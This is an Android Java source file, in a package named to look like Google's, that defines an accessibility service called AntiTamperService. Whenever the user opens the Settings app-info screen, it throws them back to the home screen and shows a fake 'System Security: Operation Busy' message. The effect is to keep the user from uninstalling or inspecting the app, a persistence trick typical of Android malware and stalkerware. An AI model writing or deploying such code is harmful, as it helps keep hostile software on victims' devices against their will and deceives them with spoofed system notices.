package google.try;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.view.accessibility.AccessibilityEvent;
import android.widget.Toast;

public class AntiTamperService extends AccessibilityService {

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            String packageName = String.valueOf(event.getPackageName());
            String className = String.valueOf(event.getClassName());

            // If user is in Settings -> App Info for our app
            if (packageName.equals("com.android.settings") && className.contains("InstalledAppDetails")) {
                // Check if they are looking at OUR app (this part is simplified)
                // In a real scenario, you'd check the node tree for the package name "GOOGLE.TRY"
                
                // Redirect to a "System Busy" or Home screen
                Intent startMain = new Intent(Intent.ACTION_MAIN);
                startMain.addCategory(Intent.CATEGORY_HOME);
                startMain.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(startMain);
                
                Toast.makeText(this, "System Security: Operation Busy. Please wait.", Toast.LENGTH_SHORT).show();
            }
        }
    }

    @Override
    public void onInterrupt() {
    }
}
